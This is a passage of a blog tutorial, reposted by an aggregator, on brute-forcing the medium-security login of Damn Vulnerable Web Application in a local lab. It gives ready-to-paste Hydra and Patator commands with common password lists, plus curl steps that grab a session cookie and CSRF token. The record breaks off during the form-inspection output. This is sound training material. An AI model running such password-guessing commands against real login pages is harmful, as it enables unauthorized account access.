---
title: DVWA - Brute Force (Medium Level) - Time Delay
url: https://blog.g0tmi1k.com/dvwa/bruteforce-medium/
source: Over Security - Cybersecurity news aggregator
date: 2022-10-25
fetch_date: 2025-10-03T20:49:01.028414
---

# DVWA - Brute Force (Medium Level) - Time Delay

* [RSS](/atom.xml "subscribe via RSS")

* [Blog](/)
* [Archives](/archives/)

# DVWA - Brute Force (Medium Level) - Time Delay

This post is a "how to" guide for **Damn Vulnerable Web Application (DVWA)'s brute force module on the medium security level**. It is an expansion from the ["low" level (which is a straightforward HTTP GET form attack)](https://blog.g0tmi1k.com/dvwa/bruteforce-low/), and then grows into the ["high" security post (which involves CSRF tokens)](https://blog.g0tmi1k.com/dvwa/bruteforce-high/). There is also an additional brute force option on the [main login screen](https://blog.g0tmi1k.com/dvwa/login/) (consisting of POST redirects and a incorrect anti-CSRF system).

![Brute Force DVWA Medium Level](/images/dvwa-bruteforce-medium.png "Brute Force DVWA Medium Level")

Once again, let's **pretend we do not know any credentials** for DVWA.

Let's **play dumb and brute force** DVWA... *again ...again*!

---

**TL;DR**: Quick copy/paste

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 ``` | ``` CSRF=$(curl -s -c dvwa.cookie "192.168.1.44/DVWA/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2) SESSIONID=$(grep PHPSESSID dvwa.cookie | cut -d $'\t' -f7) curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${CSRF}&Login=Login" "192.168.1.44/DVWA/login.php" >/dev/null  hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt  -P /usr/share/seclists/Passwords/rockyou-40.txt \   -e ns  -F  -u  -t 4  -w 15  -v  -V  192.168.1.44  http-get-form \   "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome to the password protected area:H=Cookie\: security=medium; PHPSESSID=${SESSIONID}"  patator  http_fuzz  method=GET  follow=0  accept_cookie=0  --threads=4  timeout=15  --max-retries=0 \   url="http://192.168.1.44/DVWA/vulnerabilities/brute/?username=FILE1&password=FILE0&Login=Login" \   1=/usr/share/seclists/Usernames/top_shortlist.txt  0=/usr/share/seclists/Passwords/rockyou-40.txt \   header="Cookie: security=medium; PHPSESSID=${SESSIONID}" \   -x quit:fgrep='Welcome to the password protected area' ``` |

---

Table of Contents

* + [Objectives](#Objectives)
  + [Setup](#Setup)
  + [Tools](#Tools)
  + [Creating a Session Cookie](#Creating.a.Session.Cookie)
  + [Information Gathering](#Information.Gathering)
    - [Form HTML Code](#Form.HTML.Code)
    - [Attack Vectors](#Attack.Vectors)
    - [Minimum Wait Time](#Minimum.Wait.Time)
  + [Brute Forcing](#Brute.Forcing)
    - [**Hydra**](#L.strong.Hydra..strong.)
    - [**Patator**](#L.strong.Patator..strong.)
  + [Summary](#Summary)
    - [Benchmark](#Benchmark)
    - [Why is Hydra slower than Patator?](#Why.is.Hydra.slower.than.Patator.)
    - [Conclusion](#Conclusion)

## Objectives

* The goal is to **brute force an HTTP login** page.
  + **GET requests** are made via a **form**.
  + The web page is in a **sub folder**.
* [Low](https://blog.g0tmi1k.com/dvwa/bruteforce-low/)
  + **Straight forward HTTP GET** brute force attack via a **web form**.
  + Bonus: **SQL injection** (~~[See here for more information](#*comingsoon*)~~).
* **[Medium](https://blog.g0tmi1k.com/dvwa/bruteforce-medium/)**
  + Extends on the ["low" level](https://blog.g0tmi1k.com/dvwa/bruteforce-low/) - HTTP GET attack via a web form.
  + Adds in a **static time delay** (3 seconds) on failed logins.
* [High](https://blog.g0tmi1k.com/dvwa/bruteforce-high/)
  + Extends on the ["low" level](https://blog.g0tmi1k.com/dvwa/bruteforce-low/) - HTTP GET attack via a web form.
  + This time uses a **random time delay** (between 0 and 4 seconds) instead.
  + Uses an **anti Cross-Site Request Forgery (CSRF) token**.
* ~~[Impossible](#comingsoon)~~
  + Submits data via HTTP **POST** via web form
  + **Accounts will lock out** after 5 failed logins.
    - Time delay before becoming unlocked (15 minutes).
    - Unable to enumerate users on the system.
    - Possible **"Denial of Service (DoS)" vector**.
* ~~[PHPIDS](#comingsoon)~~
  + Does not protect against this attack.
  + **All attack methods are still the same!**

---

## Setup

* Main target: [DVWA v1.10](https://github.com/RandomStorm/DVWA/releases) (Running on `Windows Server 2012 Standard ENG x64` + `IIS 8`).
  + Target setup **does not matter too much** for this - `Debian`/`Arch Linux`/`Windows`, `Apache`/`Nginx`/`IIS`, `PHP v5.x`, or `MySQL`/`MariaDB`.
  + The main target is on the IP (`192.168.1.44`), port (`80`) and subfolder (`/DVWA/`), which is known ahead of time.
  + Because the target is Windows, it does not matter about case sensitive URL requests (`/DVWA/` vs `/dvwa/`).
* Attacker: [Kali Linux v2](https://www.kali.org/) (+ [Personal Custom Post-install Script](https://github.com/g0tmi1k/os-scripts/blob/master/kali.sh)).
  + Shell prompt will look different (due to [ZSH](http://www.zsh.org/)/[Oh-My-ZSH](https://github.com/robbyrussell/oh-my-zsh)).
  + Added colour to tools output (thanks to [GRC](https://github.com/garabik/grc)).

Both machines are running inside a Virtual Machine (VMware ESXi).

---

## Tools

* cURL - Information gathering (used for viewing source code & to automate generating sessions).
* [THC-Hydra v8.1](https://www.thc.org/thc-hydra/) - A brute force tool.
* [Patator v0.5](https://github.com/lanjelot/patator) - An alternative brute force tool.
* [SecLists](https://github.com/danielmiessler/SecLists) - General wordlists.
  + These are common, default and small wordlists.
  + Instead of using a custom built wordlist, which has been crafted for our target (e.g. generated with [CeWL](https://digi.ninja/projects/cewl.php)).

---

## Creating a Session Cookie

This was covered in the first post, [low level](https://blog.g0tmi1k.com/dvwa/bruteforce-low/), which will act as a "base" to this post. I'm not going to cover this again, so if things are not clear, I highly suggest you read over the [previous post](https://blog.g0tmi1k.com/dvwa/bruteforce-low/) first.

The command has not changed; the target has not changed, so the output and result will be the same as the levels below.

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` [root:~]# CSRF=$(curl -s -c dvwa.cookie 'http://192.168.1.44/DVWA/login.php' | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2) [root:~]# curl -s -b dvwa.cookie --data "username=admin&password=password&user_token=${CSRF}&Login=Login" "http://192.168.1.44/DVWA/login.php" <head><title>Document Moved</title></head> <body><h1>Object Moved</h1>This document may be found <a HREF="index.php">here</a></body># [root:~]# sed -i '/security/d' dvwa.cookie [root:~]# ``` |

![Session Cookie](/images/dvwa-bruteforce-medium-01.png)

*Note, depending on the web server & its configuration, [it may respond slightly differently](/images/dvwa-bruteforce-medium-13.png) (in the [screenshot](/images/dvwa-bruteforce-medium-13.png): `192.168.1.11` is **Nginx**,`192.168.1.22` is **Apache** & `192.168.1.44` is **IIS**). This is a possible method to fingerprint an IIS web server.*

---

## Information Gathering

### Form HTML Code

The first thing is, to try and find out what is different *(without looking at the server side PHP source code)*. Using the same commands as before, let's see what the HTML code page is for the web form.

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ``` | ``` [root:~]# curl -s -b 'security=medium' -b dvwa.cookie 'http://192.168.1.44/DVWA/vulnerabilities/brute/' | sed -n '/<div class="body_padded/,/<\/div/p' < div class="body_padded">   <h1>Vulnerability: Brute Force</h1>    <div class="vulnerable_code_area">     <h2>Login</h2>      <form action="#" method="GET">       Username:<br />       <input type="text" name="username"><br />       Password:<br />       <input type="password" AUTOCOMPLETE="off" name="password"><br />       <br />       <input type="submit" value="Login" name="Login">      </form>    </div>         <div class="body_padded"><div class="message">You have logged in as 'admin'</div></d...